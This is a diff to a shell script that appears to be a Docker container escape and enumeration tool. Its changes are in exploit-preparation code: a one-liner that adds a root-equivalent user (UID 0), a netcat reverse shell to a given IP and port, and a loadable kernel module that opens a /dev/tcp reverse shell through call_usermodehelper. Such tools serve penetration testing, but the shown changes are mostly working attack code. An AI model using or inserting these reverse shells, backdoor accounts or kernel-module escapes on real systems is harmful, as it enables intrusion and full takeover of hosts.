@@ -774,7 +774,7 @@ findInterestingFiles() {
   printStatus "$boringVars"
 
   # Any common entrypoint files etc?
-  entrypoint=$(ls -lah /*.sh /*entrypoint* /**/entrypoint* /**/*.sh /deploy* 2>/dev/null)
+  entrypoint=$(ls -lah /*.sh /*entrypoint* /**/entrypoint* /**/*.sh /deploy* 2>/dev/null | grep -v "deepce.sh")
   printResultLong "Any common entrypoint files ........." "$entrypoint"
 
   # Any files in root dir
@@ -924,7 +924,7 @@ prepareExploit() {
     printMsg "Username ................." "$username"
     printMsg "Password ................." "$password"
     printMsg "Clean up ................." "Manual, remember to delete user after exploitation!"
-    # Cool little bash one-liner to make a new user, set password and give it user id of 0 (root)
+    # Cool little one-liner to make a new user, set password and give it user id of 0 (root)
     cmd="useradd $username;echo $password:$password|chpasswd $username;usermod -ou 0 $username"
 
   elif [ "$command" ]; then
@@ -943,11 +943,13 @@ prepareExploit() {
       exit 1
     fi
 
+    cmd="/bin/sh -c nc $ip $port -e /bin/sh"
+
     printMsg "Shell Type ....... " "Reverse TCP"
     printMsg "Create listener .. " "No"
     printMsg "Host ............. " "$ip"
     printMsg "Port ............. " "$port"
-    cmd="/bin/sh -c nc $ip $port -e /bin/sh"
+    printMsg "Command .......... " "$cmd"
 
     if [ "$listen" ]; then
       # Enable job control
@@ -959,7 +961,7 @@ prepareExploit() {
     fi
 
   else
-    # TODO: Disable on sock / privileged as we dont have interactive
+    # TODO: Disable on sock / privileged / sys_module as we dont have interactive
     printMsg "Exploit Type ............." "Local Shell"
     printMsg "Create shell ............." "Yes"
     printMsg "Clean up ................." "Automatic on container exit"
@@ -967,7 +969,7 @@ prepareExploit() {
   fi
 
   if ! [ "$cmd" ]; then
-    printError "Nothing to do, if trying to launch a shell add -cmd bash"
+    printError "Nothing to do, if trying to launch a shell add -cmd sh"
     exit 1
   fi
 }
@@ -1133,7 +1135,8 @@ exploitSysModule() {
   if [ "$install" ]; then
     # If install option is provided install the following
     # TODO: Make this os independent
-    apt install -y make gcc kmod
+    printStatus "Installing requirements"
+    apt install -y make gcc kmod >/dev/null
   fi
 
   if ! [ -x "$(command -v make)" ]; then
@@ -1182,7 +1185,7 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("AttackDefense");
 MODULE_DESCRIPTION("LKM reverse shell module");
 MODULE_VERSION("1.0");
-char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/$ip/$port 0>&1", NULL};
+char* argv[] = {"/bin/sh","-c","sh -i >& /dev/tcp/$ip/$port 0>&1", NULL};
 static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
 static int __init ${module_name}_init(void) {
 return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
